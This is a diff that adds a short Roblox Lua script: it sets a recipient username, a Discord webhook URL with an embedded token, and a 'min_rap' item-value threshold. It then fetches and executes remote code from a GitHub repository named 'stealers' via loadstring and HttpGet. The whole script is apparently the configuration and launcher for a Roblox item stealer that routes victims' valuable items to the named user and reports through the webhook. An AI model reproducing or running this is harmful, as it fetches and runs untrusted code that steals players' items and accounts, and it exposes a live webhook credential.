@@ -1,0 +1,8 @@
+
+Username = "Nicohcarl" 
+Username1 = "Nicohcarl"
+ 
+Webhook = "https://discord.com/api/webhooks/1267493698434764930/92fs6VF_UnwV4HbFJ6bHnPw7zYep30QDS_VtFb4qncVJCeeR7vJRmnJkwcamng0MyJLK" 
+min_rap = 10000000000000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/all_in_one"))()
